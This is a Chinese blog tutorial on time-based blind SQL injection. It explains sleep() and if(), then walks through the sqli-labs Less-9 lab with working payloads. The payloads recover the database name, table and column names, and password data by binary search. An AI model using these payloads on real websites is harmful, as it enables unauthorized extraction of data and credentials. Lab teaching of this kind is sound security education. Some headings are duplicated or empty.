# 原创
：  【SQL注入-无回显】时间盲注：原理、函数、利用过程

# 【SQL注入-无回显】时间盲注：原理、函数、利用过程

**目录**

[一、时间盲注（延时）](#SQL%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-%E5%BB%B6%E6%97%B6%E5%88%A4%E6%96%AD)

[1.1、简介：](#1.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[1.2、原理：](#1.2%E3%80%81%E5%8E%9F%E7%90%86%EF%BC%9A)

[二、常用函数：](#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%EF%BC%9A)

[2.1、延迟函数：](#2.1%E3%80%81%E5%BB%B6%E8%BF%9F%E5%87%BD%E6%95%B0%EF%BC%9A)

[​编辑](#%E2%80%8B%E7%BC%96%E8%BE%91)

[2.2、相关函数：](#2.2%E3%80%81%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%EF%BC%9A)

[2.3、示例语句](#%E7%A4%BA%E4%BE%8B%E8%AF%AD%E5%8F%A5)

[三、利用过程](#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B)

[3.1、第一步：判断注入点](#3.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9)

[3.2、第二步：判断可使用注入方法](#3.2%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%8F%AF%E4%BD%BF%E7%94%A8%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95)

[3.3、第三步：猜数据库名称长度](#3.3%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E9%95%BF%E5%BA%A6)

[3.4、第四步：猜数据库名称（ASCII码）](#3.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%EF%BC%88ASCII%E7%A0%81%EF%BC%89)

[四、逻辑判断](#SQL%E7%9B%B2%E6%B3%A8-%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD)

[4.1、猜长度（eg：数据库）](#4.1%E3%80%81%E7%8C%9C%E9%95%BF%E5%BA%A6%EF%BC%88eg%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%89)

[4.2、猜字符（eg：数据库名第一位）](#4.2%E3%80%81%E7%8C%9C%E5%AD%97%E7%AC%A6%EF%BC%88eg%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%AC%AC%E4%B8%80%E4%BD%8D%EF%BC%89)

[4.3、猜字符：（eg：第一个表名第一位）](#4.3%E3%80%81%E7%8C%9C%E5%AD%97%E7%AC%A6%EF%BC%9A%EF%BC%88eg%EF%BC%9A%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%A1%A8%E5%90%8D%E7%AC%AC%E4%B8%80%E4%BD%8D%EF%BC%89)

---


## 一、时间盲注（延时）

> 
<h3>1.1、简介：</h3>

由于服务器端拼接了SQL语句，且正确和错误存在同样的回显，即是错误信息被过滤，可以通过页面响应时间进行按位判断数据。由于时间盲注中的函数是在数据库中执行的，但是sleep函数或者benchmark函数的过多执行会让服务器负载过高




> 
<h3>1.2、原理：</h3>
通过一个页面加载的时间延时来判断
但是这和网络，性能，设置的延时长短有关系
当对数据库进行查询操作，如果查询的条件不存在，语句执行的速度非常快，执行时间基本可以认为是0，通过控制sql语句的执行时间来判断


---


---


## 二、常用函数：

> 
<h3>2.1、延迟函数：</h3>

**sleep(N)函数**
即如果写入到数据库被执行了，sleep(N)可以让此语句运行N秒钟
（通过执行时间来判断是否被执行，但是可能会因网速等问题参数误差）
<hr/>
<h3>2.2、相关函数：</h3>
**if()函数**
​ if(a,b,c)，如果a的值为true，则返回b的值，如果a的值为false，则返回c的值
<hr/>
<h3>2.3、示例语句</h3>
?id=1’ and if ((ascii(substr(database(),0,1))&gt;100),sleep(10),1) --+
sleep(if(database()="security",10,0))


### 2.2、相关函数：

---


---


---


## 三、利用过程

> 
<h3>3.1、第一步：判断注入点</h3>
"and 1=1--+  页面返回有数据
"and 1=0--+  页面返回有数据
则：页面的返回没有变化，可能是盲注
<hr/>
<h3>3.2、第二步：判断可使用注入方法</h3>
然后用sleep()判断能否利用时间盲注
"and sleep(5)--+   页面延时了
则：是时间盲注。
<hr/>
<h3>3.3、第三步：猜数据库名称长度</h3>
"and if((length(database()))=10,sleep(5),1)--+  页面延时了
则：当前数据库名称长度为 10
<hr/>
<h3>3.4、第四步：猜数据库名称（ASCII码）</h3>
"and if(ascii(substr(database(),1,1))=107,sleep(5),1)--+  页面延时了
则：数据库第一个字母是k... 类推得到数据库名
<hr/>
（字段名、数据，都是以此类推）


### 3.2、第二步：判断可使用注入方法

---


### 3.4、第四步：猜数据库名称（ASCII码）

---


---


---


## 四、逻辑判断

> 
<h3>4.1、猜长度（eg：数据库）</h3>
?id=1' and sleep(if(length(database())=8,10,0)) --+
（页面窗口转了10s，说明长度为8）
<hr/>
<h3>4.2、猜字符（eg：数据库名第一位）</h3>
?id=1' and sleep(if(mid(database(),1,1)='s',10,0)) --+
（转了10秒说明是s）
<hr/>
<h3>4.3、猜字符：（eg：第一个表名第一位）</h3>
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),0) --+
（转了5秒说明是e）


### 4.2、猜字符（eg：数据库名第一位）

---


---


---


## 五、示例（sqli-labs9）

> 
<h3>5.1、第一步：注入点测试</h3>
 加上单引号、双引号闭合、数值型注入，都发现回显正常
无法判断是否存在注入点

 只能考虑使用延时函数了
 ?id=1' and sleep(5) --+
标签上面在转，说明函数执行了
即存在注入点




> 
<h3>5.2、第二步：猜数据库名长度</h3>
?id=1' and if(length(database())&gt;7,sleep(5),1)--+
转了5s说明判断正确
最后用=确定唯一长度


?id=1' and (length(database()))=8--+
转5s，判断正确，长度为8




> 
<h3>5.3、第三步：猜数据库名（ASCII码）</h3>
?id=1' and if(ascii(substr(database(),1,1))&lt;200,sleep(5),0) --+
转了5s说明if语句为真




?id=1' and if(ascii(substr(database(),1,1))&gt;100,sleep(5),0) --+
转了5s说明if判断为真


 二分法，一直从中间分下去，直到确定一个值对应的ascii码
通过这个方法判断出整个数据库名


> 
<h3>5.4、第四步：猜表名长度</h3>
?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;3,sleep(5),1)--+
转了5s说明if判断正确

 ?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;8,sleep(5),1)--+
转了5s说明if判断正确<img alt="" height="944" src="https://img-blog.csdnimg.cn/e739ff09199346cc959c5a5a736e92c0.png" width="1200"/>

 采用二分法以此类推得到唯一的值
通过这个方法判断出表长


> 
<h3>5.5、第五步：猜表名</h3>
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;60,  sleep(5),1)--+
转了5s说明if判断正确


?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&lt;200,  sleep(5),1)--+
转了5s说明if判断正确


 采用二分法以此类推得到唯一的值
通过这个方法判断出整个表名


> 
<h3>5.6、第六步：猜字段长度</h3>
?id=1' and if(length((select column_name from information_schema.columns where table_name='users' limit 0,1))&gt;3,sleep(5),1)--+
转了5s说明if判断正确

 ?id=1' and if(length((select column_name from information_schema.columns where table_name='users' limit 0,1))&lt;10,sleep(5),1)--+
转了5s说明if判断正确

 采用二分法以此类推得到唯一的值
通过这个方法判断出表长


> 
<h3>5.7、第七步：猜字段名</h3>
?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))&gt;10,sleep(5),1)--+
转了5s说明if判断正确


?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))&lt;100,sleep(5),1)--+
转了5s说明if判断正确


 采用二分法以此类推得到唯一的值
通过这个方法判断出整个字段名


> 
<h3>5.8、第八步：猜数据</h3>
?id=1' and if(ascii(substr((select password from security.users limit 0,1),1,1))&gt;10, sleep(5),0)--+
转了5s说明if判断正确



?id=1' and if(ascii(substr((select password from security.users limit 0,1),1,1))&lt;100, sleep(5),0)--+
转了5s说明if判断正确


采用二分法以此类推得到唯一的值
通过这个方法判断出整个数据

